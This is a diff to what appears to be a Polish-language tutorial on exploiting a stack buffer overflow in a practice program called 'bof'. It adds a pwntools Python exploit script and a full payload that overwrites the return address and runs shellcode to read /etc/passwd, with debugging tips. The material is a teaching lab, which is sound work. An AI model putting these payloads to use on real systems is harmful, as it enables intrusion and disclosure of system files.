@@ -21,7 +21,7 @@
     4. Debuggowanie aplikacji
     5. Eksploitacja 
 3. Wykorzystanie biblioteki `pwntools` i eksploitacja aplikacji za pomocą Pythona
-    1. Uszkodznie (crash) aplikacji
+    1. Podstawy 
     2. Eksploitacja i shellcode
     
 ## 1. Konfiguracja środowiska
@@ -193,7 +193,7 @@ Wiemy, że jesteśmy w stanie manipulować rejestrem `rbp` oraz znajdującym si�
 Wystraczy więc ustawić `rip` na adres stosu, żeby móc wykonać nasz własny kod.
 Adres poprzedniej ramki w tym momencie nie ma już znaczenia.
 
-`echo -e "Krzysztof\x00\x00\x00This-rbp\xd8\xe1\xff\xff\xff\x7f\x00\x00" > stdin.bin`
+`echo -e "Krzysztof\x00\x00\x00This-rbp\xa0\xe1\xff\xff\xff\x7f\x00\x00" > stdin.bin`
 
 Udało nam się ustawić Instruction Pointer (rejestr `rip`) na adres stosu, do którego mamy bezpośredni dostęp.
 
@@ -201,3 +201,54 @@ Udało nam się ustawić Instruction Pointer (rejestr `rip`) na adres stosu, do 
 
 W kolejnej części za pomocą Pythona i biblioteki _pwntools_ wyślemy shellcode, który zostanie wykonany przez nasz program.
 
+## 3. Wykorzystanie biblioteki _pwntools_ i eksploitacja aplikacji za pomocą Pythona
+
+### Podstawy
+
+Wpierw utwórzmy plik o dowolnej nazwie w tym samym folderze, co exploiotwana przez nas aplikacja.
+Dodajmy prawo do wykonania: `chmod +x <filename>`.
+
+`exploit.py`:
+```python
+#!/bin/env python
+from pwn import *
+
+# Uruchomienie programu
+p = process("./bof");
+
+# Czekamy na pytanie
+p.readuntil("What's your name?\n")
+# Teraz program czeka na wejscie
+# === Tu wprowadzamy modyfikacje ===
+
+payload = "Krzysztof"
+
+# =================================
+# Wysylamy dane
+p.sendline(payload)
+# ...i odbieramy odpowiedz programu
+print(p.readall())
+```
+
+Uruchamiamy jak każdy wykonywalny plik na Linuxie `./exploit.py` lub za pomocą polecenie `python exploit.py`.
+
+![](images/python_pwntools_begin.png)
+
+### Eksploitacja i shellcode
+
+Następnie korzystając z wiedzy zdobytej w trakcie analizy przy użyciu _radare2_ konstruujemy payload, np. shellcode do wyświetlenia zawartości pliku `/etc/passwd`. Źródło: https://www.exploit-db.com/exploits/39700
+
+`payload = "Krzysztof\x00\x00\x00This-rbp\xa0\xe1\xff\xff\xff\x7f\x00\x00\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+
+Jeśli eksploitacja przebiegła pomyślnie powinniśmy otrzymać następujący rezultat:
+![](images/exploit_etc_passwd_result.png)
+
+Jeśli program się zcrashował możemy spróbować zdebugować nasz shellcode wykorzystując narzędzie _radare2_ lub _gdb_.
+
+![](images/radare2_exploit_etc_passwd.png)
+
+Powyżej widzimy, że nasz shellcode został poprawnie umieszczony na stosie.
+
+![](images/radare2_exploit_etc_passwd_wrong_rip.png)
+
+Ale skoczyliśmy do złego adresu. Możemy dodać do naszego payloadu instrukcje NOP (`0x90`) przed wykonaniem shellcode'u lub zweryfikować czy nasz adres powrotu jest poprawnie zamieniany.
